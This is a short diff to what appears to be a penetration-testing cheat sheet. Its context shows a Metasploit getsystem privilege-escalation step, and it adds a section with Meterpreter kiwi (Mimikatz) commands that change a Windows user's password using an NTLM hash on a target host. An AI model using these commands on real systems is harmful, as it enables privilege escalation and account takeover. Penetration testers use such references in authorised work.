@@ -204,3 +204,11 @@ set TECHNIQUE <6>
 use post/windows/escalate/getsystem
 run -o SESSION=<1>,TECHNIQUE=<6>
 ```
+
+# Mimikatz
+## Meterpreter
+### Change password
+```ruby
+load kiwi
+password_change -n <NTLM> -P <new_password> -u <user> -s <host>
+```
